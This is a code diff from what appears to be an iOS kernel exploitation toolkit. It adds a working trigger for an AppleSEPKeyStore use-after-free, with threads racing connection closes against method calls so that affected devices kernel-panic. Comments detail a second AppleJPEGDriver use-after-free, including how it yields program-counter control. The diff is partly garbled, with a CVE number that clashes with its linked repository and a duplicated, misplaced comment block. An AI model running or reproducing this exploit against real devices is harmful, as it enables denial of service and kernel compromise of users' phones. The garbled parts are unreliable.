@@ -78,7 +78,86 @@ extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 #define kIOSurfacePixelFormat CFSTR("IOSurfacePixelFormat")
 
 // ===========================================================================
-// 4. CVE-2026-20687 port: AppleJPEGDriver startDecoder() timeout UAF
+// 5. CVE-2026-20637 port: AppleSEPKeyStore IOCommandGate UAF
+//    Public PoC: github.com/zeroxjf/CVE-2026-20687-AppleSEPKeyStore-UAF
+//    "Target Versions: iOS 26.1 - 26.2 (TESTED)" - our exact build (23C5027f),
+//    fixed in 26.3.  Apple: "An app may be able to cause unexpected system
+//    termination" (use after free).  The PoC immediately kernel-panics
+//    affected devices.
+//    Shape: 8 caller threads hammer IOConnectCallMethod on selectors 0-15
+//    while 4 closer threads race IOServiceClose; the main thread opens 100k
+//    connections with rotating types (0x2022/0xbeef/0x1337/0x4141) and NO
+//    delay, keeping the close/call race window hot.  The panic is
+//    "[iokit.IOCommandGate]: element modified after free" (a freed 80-byte
+//    gate element at offset 72).
+// ===========================================================================
+static volatile io_connect_t g_aks_conn = 0;
+static volatile int g_aks_done = 0;
+static volatile int g_aks_calls = 0;
+static volatile int g_aks_closes = 0;
+static volatile int g_aks_opens = 0;
+
+NSString *ModAksUAF(void) {
+    AveLog(@"[aks20637] === CVE-2026-20637: AppleSEPKeyStore IOCommandGate UAF (public PoC, TESTED on 26.1-26.2) ===");
+    g_aks_conn = 0; g_aks_done = 0; g_aks_calls = 0; g_aks_closes = 0; g_aks_opens = 0;
+
+    CFMutableDictionaryRef m = IOServiceMatching("AppleKeyStore");
+    if (!m) return @"AppleKeyStore: no matching dictionary";
+    io_iterator_t it = 0;
+    if (IOServiceGetMatchingServices(kIOMainPortDefault, m, &it) != KERN_SUCCESS || !it)
+        return @"AppleKeyStore: service not found";
+    io_service_t svc = IOIteratorNext(it);
+    IOObjectRelease(it);
+    if (!svc) return @"AppleKeyStore: no service instance";
+
+    // 8 caller threads: hammer selectors 0-15 on the live connection
+    for (int t = 0; t < 8; t++) {
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            while (!g_aks_done) {
+                io_connect_t c = g_aks_conn;
+                if (!c) continue;
+                for (uint32_t sel = 0; sel < 16; sel++) {
+                    uint64_t sc[6] = {1, 2, 3, 4, 5, 6};
+                    IOConnectCallMethod(c, sel, sc, 6, NULL, 0, NULL, NULL, NULL, NULL);
+                    __sync_fetch_and_add(&g_aks_calls, 1);
+                }
+            }
+        });
+    }
+    // 4 closer threads: race IOServiceClose
+    for (int t = 0; t < 4; t++) {
+        dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+            while (!g_aks_done) {
+                io_connect_t c = g_aks_conn;
+                if (!c) continue;
+                IOServiceClose(c);
+                __sync_fetch_and_add(&g_aks_closes, 1);
+                g_aks_conn = 0;
+            }
+        });
+    }
+    // main: 100k connections, rotating types, no delay (the hot race window)
+    const uint32_t types[4] = {0x2022, 0xbeef, 0x1337, 0x4141};
+    const int N = 100000;
+    for (int i = 0; i < N; i++) {
+        io_connect_t conn = 0;
+        if (IOServiceOpen(svc, mach_task_self(), types[i % 4], &conn) == KERN_SUCCESS && conn) {
+            g_aks_conn = conn;
+            __sync_fetch_and_add(&g_aks_opens, 1);
+        }
+        if ((i & 0x3FFF) == 0x3FFF)
+            AveLog(S(@"[aks20637] %d/%d opens (calls=%d closes=%d)", i, N, g_aks_calls, g_aks_closes));
+    }
+    g_aks_done = 1;
+    usleep(200000);
+    if (g_aks_conn) { IOServiceClose(g_aks_conn); g_aks_conn = 0; }
+    IOObjectRelease(svc);
+    AveLog(S(@"[aks20637] done: opens=%d calls=%d closes=%d (a panic = the IOCommandGate UAF fired)",
+             g_aks_opens, g_aks_calls, g_aks_closes));
+    AveSetStatus(@"20637 trigger done - see the log");
+    return S(@"20637: %d opens, %d calls, %d closes; a panic = the IOCommandGate UAF fired",
+              g_aks_opens, g_aks_calls, g_aks_closes);
+}
 //    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
 //    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
 //    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
@@ -96,6 +175,18 @@ extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 //    requests, close under flight) and reports the wired-memory delta and
 //    every return code.  The deferred panic usually needs one sync decode
 //    afterwards (the PoC uses the Camera app).
+// ===========================================================================
+// ===========================================================================
+// 4. CVE-2026-20687 port: AppleJPEGDriver startDecoder() timeout UAF
+//    Public PoC: github.com/0xjohnnydev/CVE-2026-20687-AppleJPEGDriver-UAF
+//    (validated by Mallory; tested on A19 / iOS 26.3).  FIXED IN 26.4 - our
+//    23C5027f (26.2b1) is VULNERABLE.  Apple's own text: "An app may be able
+//    to cause unexpected system termination or WRITE KERNEL MEMORY".
+//    Shape: selector 1 = decode, structIn = structOut = 0x58; asyncToken != 0
+//    pushes the request node (req+0x78) into the per-codec vector; closing
+//    the client with requests in flight frees the JpegRequest (0x440 bytes)
+//    WITHOUT dequeuing; a later queue walk reads the stale node (req+0x80)
+//    -> UAF.  req+0x00 is a task_t, so a vtable-style deref is PC control.
 // ===========================================================================
 typedef struct __attribute__((packed)) {
     uint32_t sourceID;      // +0x00 source IOSurface id (JPEG bytes)
